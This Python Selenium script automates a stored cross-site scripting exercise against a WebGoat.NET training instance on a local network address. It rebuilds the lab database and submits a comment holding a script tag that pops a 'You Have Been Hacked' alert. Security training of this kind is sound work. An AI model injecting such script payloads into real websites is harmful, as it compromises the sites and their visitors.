from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.service import Service
from selenium.webdriver.firefox.options import Options
from selenium.webdriver.common.alert import Alert
import time
# import subprocess


options = Options()
options.binary_location = "/usr/bin/firefox"

service = Service(executable_path='/usr/local/bin/geckodriver')
driver = webdriver.Firefox(service=service, options=options)
driver.get("http://192.168.29.215/webgoat.net/")
time.sleep(2)

# Rebuilding Database
rebuildDatabaseOption = driver.find_element(By.XPATH, "/html/body/form/div[3]/div/div[1]/ul/li[1]/ul/li[3]/a").click()
rebuildDatabase = driver.find_element(By.XPATH, "//*[@id='ctl00_BodyContentPlaceholder_btnRebuildDatabase']").click()
time.sleep(20)
rebuildStatus = driver.find_element(By.XPATH, "/html/body/form/div[3]/div/div[2]/div[4]/div[2]/div").text
time.sleep(1)
print("Database Rebuild Status : ", rebuildStatus)

# Opening XSS Options in Webpage
xssOption = driver.find_element(By.XPATH, "/html/body/form/div[3]/div/div[1]/ul/li[4]/a").click()
storeXSSOption = driver.find_element(By.XPATH, "/html/body/form/div[3]/div/div[1]/ul/li[4]/ul/li[1]/a").click()

# Inputing User Information
email = driver.find_element(By.XPATH, "//*[@id='ctl00_BodyContentPlaceholder_txtEmail']")
email.send_keys("human123@gmail.com")

comment = driver.find_element(By.XPATH, "//*[@id='ctl00_BodyContentPlaceholder_txtComment']")
comment.send_keys('<script>alert("You Have Been Hacked")</script>')

submitComment= driver.find_element(By.XPATH, "//*[@id='ctl00_BodyContentPlaceholder_btnSave']").click()
time.sleep(10)

try:
    alert = Alert(driver)
    alert.dismiss()
    print("Alert has been Dismissed Successfully.")
except Exception as e:
    print("No Alert has been found or An Error occured while handling Alert : ", str(e))

driver.close()
